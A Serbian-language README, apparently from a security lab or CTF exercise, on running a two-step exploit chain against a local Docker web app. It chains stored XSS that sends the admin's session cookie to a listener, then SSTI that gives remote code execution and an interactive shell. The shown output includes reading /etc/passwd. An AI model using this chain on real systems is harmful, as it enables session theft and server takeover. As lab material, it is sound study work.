# Pokretanje exploita

## Preduslovi
- Python 3
- `pip install requests`
- Docker Desktop pokrenut
- Aplikacija pokrenuta: `docker-compose up --build`
- Nalog `user1` registrovan na `http://localhost:8000`

---

## Korak 1 — Privilege Escalation (admin cookie)

```powershell
python script.py http://localhost:8000 user1 user1
```

Čekati oko 1 minut. Kada cron job uloguje admina, skripta ispisuje:

```
[*] Logged in as user1
[*] Set user1's description to XSS payload
[*] Listening on localhost:8001...
[*] Waiting for admin to visit homepage...
[+] Got admin cookie: PHPSESSID=<vrednost>
[=] Session ID: <vrednost>
```

---

## Korak 2 — Remote Code Execution

```powershell
python rce_ssti.py http://localhost:8000 "PHPSESSID=<vrednost iz koraka 1>"
```

Očekivani izlaz:

```
[*] Ubacujem SSTI payload u MotD...
[+] Payload ubacen!
[*] Izvrsavam: id
[+] RCE uspešan!
==================================================
uid=33(www-data) gid=33(www-data) groups=33(www-data)
==================================================
[*] Interaktivni mod (CTRL+C za izlaz):
$ whoami
www-data
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
```

Nakon toga se otvara interaktivni shell za dalje izvršavanje komandi.